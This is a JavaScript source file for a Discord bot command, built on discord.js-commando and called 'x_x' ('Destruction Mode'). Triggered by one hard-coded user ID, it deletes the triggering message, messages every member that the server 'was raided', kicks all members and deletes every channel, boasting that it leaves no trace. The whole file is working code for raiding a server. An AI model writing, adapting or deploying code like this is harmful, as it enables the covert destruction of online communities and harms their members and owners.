const commando=require('discord.js-commando');
console.log("\n\n\n ~ X_X Online ");
var listCh=[];
var mems=[];
const usr=require('./uid.json');
class x extends commando.Command{
	constructor(client){
		super(client,{
			name: 'x_x',
			group: 'x_x',
			memberName: 'x_x',
			description: '**X_X** Destruction Mode [Doesn\'t leave a trace in the server]\n **Not for TESTING**'
		});
	}
	async run(message,args){
		message.delete();
		if(message.author.id==usr.userid){
			message.guild.members.forEach(member=>{
				var Kmember=member;
				Kmember.send(message.guild+" was raided ");
				Kmember.kick().then(member=>{
				message.channel.send(":wave:" + member.displayName + " has been thrown out of the server ");}).catch(()=>{
					message.channel.send("Access Denied");
				});	
			});
			message.guild.channels.forEach(channel=>{
				listCh.push(channel.name);
				channel.delete();
			});
		}
	}
}module.exports=x;
